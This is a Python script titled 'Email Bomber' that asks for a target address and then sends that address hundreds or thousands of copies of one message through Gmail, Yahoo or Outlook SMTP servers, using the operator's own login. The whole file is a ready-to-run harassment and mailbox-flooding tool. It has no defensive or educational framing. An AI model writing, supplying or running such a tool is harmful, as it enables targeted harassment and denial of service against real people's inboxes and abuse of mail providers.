import smtplib
import sys
import ctypes
import colorama
from colorama import init, Fore
import os
colorama.init()

def banner():

    print(Fore.GREEN + ''' 
    ╔═╗╔╦╗╔═╗╦╦    ╔╗ ╔═╗╔╦╗╔╗ ╔═╗╦═╗
    ║╣ ║║║╠═╣║║    ╠╩╗║ ║║║║╠╩╗║╣ ╠╦╝
    ╚═╝╩ ╩╩ ╩╩╩═╝  ╚═╝╚═╝╩ ╩╚═╝╚═╝╩╚═
                By: Vexy
    '''+ Fore.RESET)


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            self.target = str(input("Enter a email to bomb: "))
            self.mode = int(input( '\nEnter BOMB mode (1,2,3,4) \n| 1:(1000) 2:(500) 3:(250) 4:(custom) : '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            os.system('cls')
            print(Fore.LIGHTCYAN_EX+'| '+Fore.RESET+ 'Setting up the bomb'+ Fore.RESET) 
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                os.system('cls')
                self.amount = int(input('Choose a CUSTOM amount <: '))
            print(Fore.LIGHTCYAN_EX + '| '+Fore.RESET + f'You have selected BOMB mode: {self.mode} and {self.amount} emails'+ Fore.RESET)
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(Fore.LIGHTCYAN_EX + '| '+Fore.RESET+'Setting up email' + Fore.RESET)
            self.server = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Select a email server - 1:Gmail 2:Yahoo 3:Outlook: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(Fore.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            os.system('cls')
            self.fromAddr = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Enter your email: '))
            self.fromPwd = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Enter your password: '))
            self.subject = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Type your subject: '))
            self.message = str(input(Fore.LIGHTCYAN_EX + '| ' + Fore.RESET + 'Type your message: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(Fore.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(Fore.RED + '\nStarting')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(Fore.RED + '\nFinished')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
